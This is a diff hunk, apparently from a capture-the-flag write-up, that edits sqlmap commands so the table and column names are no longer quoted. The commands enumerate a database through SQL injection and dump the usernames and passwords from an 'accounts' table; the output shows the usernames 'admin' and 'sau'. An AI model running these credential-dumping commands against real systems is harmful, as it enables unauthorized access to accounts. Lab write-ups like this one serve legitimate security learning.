@@ -14,21 +14,21 @@ With the file I used 'sqlmap -r pc_admin --dbs' to check if there is a vulnerabi
 | accounts |
 | messages |
 +----------+
-I want to look at the 'accounts' table so 'sqlmap -r pc_admin -T "accounts" --column' finds out columns in the 'accounts' table.
+I want to look at the 'accounts' table so 'sqlmap -r pc_admin -T accounts --column' finds out columns in the 'accounts' table.
 +----------+------+
 | Column   | Type |
 +----------+------+
 | password | TEXT |
 | username | TEXT |
 +----------+------+
-'sqlmap -r pc_admin -T "accounts" -C "username" --dump' dump usernames from the username column.
+'sqlmap -r pc_admin -T accounts -C username --dump' dump usernames from the username column.
 +----------+
 | username |
 +----------+
 | admin    |
 | sau      |
 +----------+
-'sqlmap -r pc_admin -T "accounts" -C "password" --dump' does the same thing but for the password column.
+'sqlmap -r pc_admin -T accounts -C password --dump' does the same thing but for the password column.
 +------------------------+
 | password               |
 +------------------------+
